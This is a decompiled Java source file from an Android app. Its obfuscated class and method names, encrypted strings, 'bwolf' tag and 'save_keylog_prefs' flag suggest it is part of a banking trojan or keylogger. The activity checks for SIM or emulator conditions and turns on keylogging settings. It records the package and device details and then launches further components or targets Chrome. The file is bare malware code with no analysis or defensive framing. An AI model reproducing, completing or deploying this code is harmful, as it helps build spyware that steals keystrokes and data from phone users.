package com.sonnokta;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;

import com.sonnokta.R;

import fddo.Cbreak;
import fddo.Cfor;
import fddo.Cgoto;
import fddo.Cthrow;

public class p079j extends Activity {
    private static String TAG = "bwolf-p079j";

    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        Context applicationContext = getApplicationContext();

        try {
            boolean canWrite = Settings.System.canWrite(this);

            String str = Cfor.ifdf;
            if (!str.contains("BLOCKNOSIM") || Cgoto.fddo(applicationContext)) {
                if (str.contains("KLPF")) {
                    Cthrow.m154case(applicationContext, "save_keylog_prefs", Boolean.TRUE);
                }
                Cthrow.m159this(applicationContext, Cbreak.fddo("5dadd85a33c7f7f07b0caf365051270eafa3"), getComponentName().getPackageName());
                Cthrow.m159this(applicationContext, Cbreak.fddo("5dadd85a33c7f7f07b0cbc314451270eafa3"), getComponentName().getClassName());
                Cthrow.m159this(applicationContext, Cbreak.fddo("57acc65e3dc5fefb6b0caf36507d"), Cgoto.m128protected(applicationContext));
                String fddo2 = Cbreak.fddo("4ca7d64339dff7ec5021ba3a5e7d3d0ab0a363");
                Boolean bool = Boolean.FALSE;
                if (!Cthrow.fddo(applicationContext, fddo2, bool).booleanValue()) {
                    Cgoto.sartjsrtfjsrfjtsrtjgfhe(applicationContext);
                    Cthrow.m154case(applicationContext, Cbreak.fddo("4ca7d64339dff7ec5021ba3a5e7d3d0ab0a363"), Boolean.TRUE);
                }

                Cgoto.y(applicationContext);
                if (Cthrow.fddo(applicationContext, Cbreak.fddo("4daada5d03c8f1ed6d"), bool).booleanValue()) {
                    Intent intent = new Intent(applicationContext, p036o.class);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    applicationContext.startActivity(intent);
                } else if (Cgoto.dfhaefdhadfhdfherh(applicationContext)) {
                    if (!Cgoto.m132strictfp(applicationContext, "com.android.chrome").isEmpty()) {
                        Cgoto.e(applicationContext, "com.android.chrome");
                    }
                    finish();
                }
                finish();
                return;
            }
            finish();
        } catch (Exception e) {
            Cgoto.m110class(applicationContext, Cbreak.fddo("7b9af67511e8dbd0"), e);
        }
    }
}
